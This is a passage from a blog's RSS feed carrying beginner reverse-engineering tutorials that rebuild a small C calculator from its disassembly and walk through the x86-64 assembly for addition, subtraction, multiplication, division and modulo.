<li>pointer to the function which is selected on the basis of operator. This is stored at <code>[rbp-8]</code>.</li>
</ul>
<p>Now that we&rsquo;re in <code>.L13</code>,</p>
<p>We assign the <code>number1</code>, <code>number2</code>, and the <code>function pointer</code> to <code>eax</code>, <code>edx</code>, and <code>rcx</code>, respectively. The <code>function</code> is then called with the arguments <code>number1</code> and <code>number2</code>. Finally, the outcome is saved.</p>
<p>The remainder of the <code>.L13</code> consists entirely of calling a <code>printf</code> function with a format string and other local variables. The final result will look like this: <code>&lt;number1&gt; &lt;operator&gt; &lt;number2&gt; = &lt;result_from_function&gt;</code>. I&rsquo;ll leave it to you to dissect and solve the final puzzle piece. After printing, the function then exits gracefully.</p>
<p>Now we can put everything together, and the complete code should look something like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Function to perform addition
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">addFunc</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Function to perform subtraction
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">subFunc</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">a</span> <span class="o">-</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Function to perform multiplication
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">mulFunc</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Function to perform division
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">divFunc</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">a</span> <span class="o">/</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Function to print usage message and exit
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">die</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Not enough arguments passed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Usage: ./calc &lt;num1&gt; &lt;operator&gt; &lt;num2&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// main function
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="nf">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">option</span> <span class="o">=</span> <span class="o">*</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">switch</span><span class="p">(</span><span class="n">option</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="sc">&#39;+&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                      <span class="n">fp</span> <span class="o">=</span> <span class="n">addFunc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="sc">&#39;-&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                      <span class="n">fp</span> <span class="o">=</span> <span class="n">subFunc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="sc">&#39;*&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                      <span class="n">fp</span> <span class="o">=</span> <span class="n">mulFunc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="sc">&#39;/&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                      <span class="n">fp</span> <span class="o">=</span> <span class="n">divFunc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d %c %d = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">option</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="nf">fp</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This may not be what the original developer wrote, but it will certainly behave the same. That is the entire point of reverse engineering. Dissecting something with your tools to understand how it behaves and then creating something that mimics the behavior.</p>
<p>I&rsquo;ll encourage you to go and try to reverse engineer some more binaries. You can build your own if you want or just download some from online platforms like <a href="https://crackmes.one/">crackme.one</a>. Have fun!!</p>
<p><img loading="lazy" src="https://media.giphy.com/media/OB4Sjggq8aMJnq4sLQ/giphy.gif#center" alt=""  />
</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://stackoverflow.com/questions/381542/with-arrays-why-is-it-the-case-that-a5-5a">https://stackoverflow.com/questions/381542/with-arrays-why-is-it-the-case-that-a5-5a</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Intro to RE: C : part-3</title>
      <link>https://ayedaemon.github.io/post/2023/04/intro-to-re-part-3/</link>
      <pubDate>Sat, 01 Apr 2023 21:59:33 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2023/04/intro-to-re-part-3/</guid>
      <description>Blog covers how disassembly of basic operations and functions in C programming looks like.</description>
      <content:encoded><![CDATA[<p>In the previous blog, I discussed some of the basic C program&rsquo;s disassembly structures, concentrating on the variables and their memory layouts. This article, a follow-up to the previous one, focuses on basic operations and functions in C programs.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/3BUYbmXltgQ4zu0Tv5/giphy.gif#center" alt=""  />
</p>
<p>In the previous blogs, we have seen what an empty C program looks like</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{}</span>
</span></span></code></pre></div><p>Disassembly:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><h2 id="arithmatic-operators">Arithmatic operators</h2>
<p>Now if we want to work with operations, we&rsquo;ll have to add 2 local variables to the function. Something like in the below example.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><h3 id="addition">Addition</h3>
<p>Now let&rsquo;s perform add operation on the 2 local variables we created and save the result in a new variable.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>We can see a few new instructions in the disassembly code that are responsible for the <code>int c = a + b</code> instruction in the source code.</p>
<p>When we look at them separately, it becomes quite natural to understand.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">edx</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>      <span class="c1">; Save the first variable value in EDX register
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>      <span class="c1">; Save the second variable value in EAX register
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">add</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">edx</span>                    <span class="c1">; add EAX and EDX register values, this stores the result in EAX here
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>     <span class="c1">; Move the new value of EAX to third variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Let&rsquo;s look at other arithmetic operations as well</p>
<h3 id="subtraction">Subtraction</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="n">a</span> <span class="o">-</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>      <span class="c1">; load first variable in EAX
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">sub</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>      <span class="c1">; subtract EAX with second variable, then save the result in EAX
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>     <span class="c1">; save the new value of EAX in the third register
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><h3 id="multiplication">Multiplication</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>      <span class="c1">; load first variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">imul</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>      <span class="c1">; multiply it with second
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>     <span class="c1">; save it in the third
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><h3 id="division-and-modulo">Division and modulo</h3>
<p>If you are not aware, the division operation is about calculating the quotient and the modulo operation is about the remainder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="n">a</span> <span class="o">/</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">d</span> <span class="o">=</span> <span class="n">a</span> <span class="o">%</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; first and second variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; division
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>      <span class="c1">; Load first variable in EAX
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">cdq</span>                                 <span class="c1">; Convert double to quad value;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">idiv</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>           <span class="c1">; perform idiv operation with second variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>     <span class="c1">; Store new EAX value in third variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="c1">; modulo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>      <span class="c1">; Load the first value again
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">cdq</span>                                 <span class="c1">; Convert double to quad value;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">idiv</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>           <span class="c1">; perform idiv operation with second variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-16</span><span class="p">],</span> <span class="no">edx</span>     <span class="c1">; Store the EDX value in fourth variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="c1">; epilogue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>If you didn&rsquo;t notice, the <strong>division result</strong> was stored in the <code>EAX</code> register, while the <strong>modulo result</strong> was stored in the <code>EDX</code>&hellip;Everything else stays unchanged.</p>
<p>Its OKAY if you are having questions like-</p>
<ul>
<li>How?</li>
<li>why EDX??</li>
<li>WTF is going on???</li>
<li>Does it perform both operations even if either one of them is required????</li>
</ul>
<p>These instructions, however, are not as simple to understand as others. So allow me to attempt to explain what&rsquo;s going on.</p>
<p>To begin, you must comprehend the cdq instruction&rsquo;s magic. This converts a <code>Doubleword</code> to a <code>Quadword</code> by extending the sign bit of <code>EAX</code> into the <code>EDX</code> register. For the purposes of this blog, consider the <code>EAX</code> and <code>EDX</code> to be joined together to form a large quadword register. So, if <code>EDX</code> contains <code>0x12</code> and <code>EAX</code> contains <code>0x3456789a</code>, the resulting value is <code>0x123456789a</code>. Does that make sense?</p>
<p>So when a <code>idiv</code> (or other <code>div</code> derivatives) operation is performed, both the quotient and the remainder are calculated. The instruction stores the quotient in <code>EAX</code> and the remainder in <code>EDX</code> register.</p>
<p>Now that you understand the concept, you can think about removing some of the repeated instructions to make your program smaller and run faster.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">; prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; first and second variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">; division and modulo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">]</span>      <span class="c1">; Load first variable in EAX
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">cdq</span>                                 <span class="c1">; Convert double to quad value;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">idiv</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">]</span>           <span class="c1">; perform idiv operation with second variable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="no">eax</span>     <span class="c1">; Store new EAX value in third variable (quotient)
